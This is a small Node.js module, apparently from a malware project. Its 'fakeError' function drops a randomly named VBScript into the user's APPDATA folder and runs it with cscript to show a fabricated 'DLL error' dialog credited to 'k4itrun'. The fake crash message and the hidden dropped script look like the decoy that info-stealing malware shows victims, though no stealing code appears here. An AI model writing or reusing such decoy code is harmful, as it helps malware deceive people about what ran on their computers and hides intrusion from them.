const { exec } = require("child_process"),
    fs = require("fs");

const id = (h) => {
    try {
        let c = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        let r = "";
        for (let i = 0; i < h; i++) {
            r += c.charAt(Math.floor(Math.random() * c.length));
        }
        return r;
    } catch (e) {
        console.error(e);
        return "ABC";
    }
};

const fakeError = async (m) => {
    let random = id(10), vbs = process.env.APPDATA + "\\" + random + ".vbs";
    fs.writeFileSync(vbs, `Set objShell = WScript.CreateObject("WScript.Shell")\nMsgBox "Error: ${m === "" ? "DLL error by k4itrun":m}", vbInformation, "Error Code: 43"`, "utf8");
    exec("cscript " + vbs, (err, stdout, stderr) => {
        if (err) console.log(err);
    });
}

module.exports = {
    fakeError,
};